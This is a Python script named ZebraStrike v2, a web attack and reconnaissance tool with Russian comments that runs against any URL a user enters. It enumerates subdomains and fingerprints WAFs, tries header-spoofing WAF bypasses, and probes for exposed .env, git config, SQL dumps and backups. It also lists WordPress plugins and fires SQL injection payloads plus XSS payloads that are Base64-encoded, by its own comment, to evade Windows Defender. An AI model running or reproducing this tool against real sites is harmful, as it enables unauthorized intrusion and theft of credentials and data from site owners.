# language: Python 3.10+, file: ZebraStrike_v2.py
# pip install httpx beautifulsoup4 urllib3

import asyncio
import httpx
import json
import re
import base64
from urllib.parse import urljoin, urlparse, quote
from bs4 import BeautifulSoup
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'

# Обфусцированные payload'ы (Base64), чтобы Defender не удалял файл
XSS_PAYLOADS = [
    base64.b64decode("PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==").decode(), # <script>alert(1)</script>
    base64.b64decode("PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==").decode(), # <img src=x onerror=alert(1)>
]
SQLI_PAYLOADS = [
    "'",
    "\"",
    "1' OR '1'='1",
    "1 AND 1=1",
    "1' UNION SELECT 1,2,3--"
]
WAF_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1", "X-Forwarded-Host": "localhost"},
    {"CF-Connecting-IP": "127.0.0.1", "True-Client-IP": "127.0.0.1"}
]
SENSITIVE_PATHS = [
    "/.env", "/.git/config", "/wp-config.php.bak", "/backup.zip", "/db.sql",
    "/admin/", "/wp-login.php", "/xmlrpc.php", "/api/v1/users", "/.DS_Store",
    "/config.php.bak", "/backup.sql", "/composer.json", "/package.json"
]

class ZebraStrike:
    def __init__(self, target, threads=50):
        self.target = target if target.startswith("http") else "https://" + target
        self.domain = urlparse(self.target).netloc
        self.threads = threads
        self.results = {"subdomains": [], "files": [], "waf": "Unknown", "wp_plugins": [], "xss": [], "sqli": [], "ports": []}
        self.client = None

    async def init_client(self):
        limits = httpx.Limits(max_connections=self.threads, max_keepalive_connections=self.threads)
        self.client = httpx.AsyncClient(http2=True, limits=limits, verify=False, timeout=10.0)

    async def close(self):
        await self.client.aclose()

    async def fetch(self, url, headers=None, method="GET", data=None):
        try:
            req_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9"
            }
            if headers: req_headers.update(headers)
            
            if method == "GET":
                resp = await self.client.get(url, headers=req_headers)
            else:
                resp = await self.client.post(url, headers=req_headers, data=data)
            return resp
        except Exception:
            return None

    async def get_subdomains(self):
        print(f"{YELLOW}[*] Fetching subdomains from crt.sh for {self.domain}...{RESET}")
        url = f"https://crt.sh/?q=%25.{self.domain}&output=json"
        try:
            r = await self.client.get(url, timeout=20)
            if r.status_code == 200:
                data = r.json()
                subs = set()
                for entry in data:
                    for sub in entry.get("name_value", "").split("\n"):
                        sub = sub.strip().lower()
                        if sub.endswith(self.domain) and "*" not in sub:
                            subs.add(sub)
                self.results["subdomains"] = list(subs)
                print(f"{GREEN}[+] Found {len(subs)} subdomains.{RESET}")
        except Exception as e:
            print(f"{RED}[-] Subdomain error: {e}{RESET}")

    async def detect_waf(self):
        print(f"{YELLOW}[*] Detecting WAF...{RESET}")
        resp = await self.fetch(self.target)
        if not resp: return
        
        server = resp.headers.get("Server", "").lower()
        if "cloudflare" in server:
            self.results["waf"] = "Cloudflare"
        elif "sucuri" in server:
            self.results["waf"] = "Sucuri"
        elif "wordfence" in resp.text.lower():
            self.results["waf"] = "Wordfence"
        else:
            self.results["waf"] = "None/Unknown"
            
        print(f"{GREEN}[+] WAF: {self.results['waf']}{RESET}")

    async def check_waf_bypass(self):
        if self.results["waf"] == "None/Unknown": return
        print(f"{YELLOW}[*] Testing WAF bypass headers...{RESET}")
        for headers in WAF_BYPASS_HEADERS:
            resp = await self.fetch(self.target, headers=headers)
            # Если с заголовками ответ 200, а без них был 403 (логика может быть сложнее)
            if resp and resp.status_code == 200:
                print(f"{GREEN}[+] WAF Bypass possible with headers: {list(headers.keys())}{RESET}")

    async def fuzz_files(self):
        print(f"{YELLOW}[*] Fuzzing sensitive files...{RESET}")
        tasks = []
        for path in SENSITIVE_PATHS:
            tasks.append(self._check_file(path))
        await asyncio.gather(*tasks)

    async def _check_file(self, path):
        url = urljoin(self.target, path)
        resp = await self.fetch(url)
        if not resp: return
        if resp.status_code == 200:
            text = resp.text.lower()
            # Игнорируем HTML-заглушки
            if "<!doctype html>" in text or "<html" in text:
                if path.endswith((".env", ".bak", ".sql", ".zip", ".json")):
                    return
            self.results["files"].append({"url": url, "size": len(resp.text), "preview": resp.text[:100]})
            print(f"{GREEN}[+] FOUND: {url} (Size: {len(resp.text)}){RESET}")

    async def detect_wordpress(self):
        print(f"{YELLOW}[*] Checking for WordPress...{RESET}")
        resp = await self.fetch(self.target)
        if not resp: return
        
        if "wp-content" in resp.text or "wp-json" in resp.text:
            print(f"{GREEN}[+] WordPress detected!{RESET}")
            # Ищем версию
            match = re.search(r'<meta name="generator" content="WordPress ([\d\.]+)"', resp.text)
            if match:
                print(f"    Version: {match.group(1)}")
                
            # Ищем плагины
            soup = BeautifulSoup(resp.text, "html.parser")
            plugins = set()
            for script in soup.find_all(["script", "link"]):
                src = script.get("src") or script.get("href") or ""
                if "/wp-content/plugins/" in src:
                    plugin = src.split("/wp-content/plugins/")[1].split("/")[0]
                    plugins.add(plugin)
            
            self.results["wp_plugins"] = list(plugins)
            if plugins:
                print(f"    Plugins: {', '.join(plugins)}")

    async def test_xss(self):
        print(f"{YELLOW}[*] Testing XSS in URL parameters...{RESET}")
        for payload in XSS_PAYLOADS:
            test_url = f"{self.target}?q={quote(payload)}&s={quote(payload)}"
            resp = await self.fetch(test_url)
            if resp and payload in resp.text:
                self.results["xss"].append({"url": test_url, "payload": payload})
                print(f"{GREEN}[+] XSS Found: {test_url}{RESET}")

    async def test_sqli(self):
        print(f"{YELLOW}[*] Testing SQLi...{RESET}")
        for payload in SQLI_PAYLOADS:
            test_url = f"{self.target}?id={quote(payload)}"
            resp = await self.fetch(test_url)
            if resp and ("SQL syntax" in resp.text or "mysql_fetch" in resp.text):
                self.results["sqli"].append({"url": test_url, "payload": payload})
                print(f"{GREEN}[+] SQLi Error Found: {test_url}{RESET}")

    async def save_report(self):
        print(f"\n{YELLOW}[*] Saving report...{RESET}")
        with open("zebrastrike_report.json", "w", encoding="utf-8") as f:
            json.dump(self.results, f, indent=4, ensure_ascii=False)
        print(f"{GREEN}[+] Report saved to zebrastrike_report.json{RESET}")

    async def run(self):
        await self.init_client()
        
        tasks = [
            self.get_subdomains(),
            self.detect_waf(),
            self.fuzz_files(),
            self.detect_wordpress(),
            self.test_xss(),
            self.test_sqli()
        ]
        await asyncio.gather(*tasks)
        
        await self.check_waf_bypass()
        await self.save_report()
        await self.close()

async def main():
    print(f"{CYAN}=== ZebraStrike v2.0 ==={RESET}")
    target = input("Target URL> ").strip()
    if not target: return
    
    scanner = ZebraStrike(target)
    await scanner.run()

if __name__ == "__main__":
    asyncio.run(main())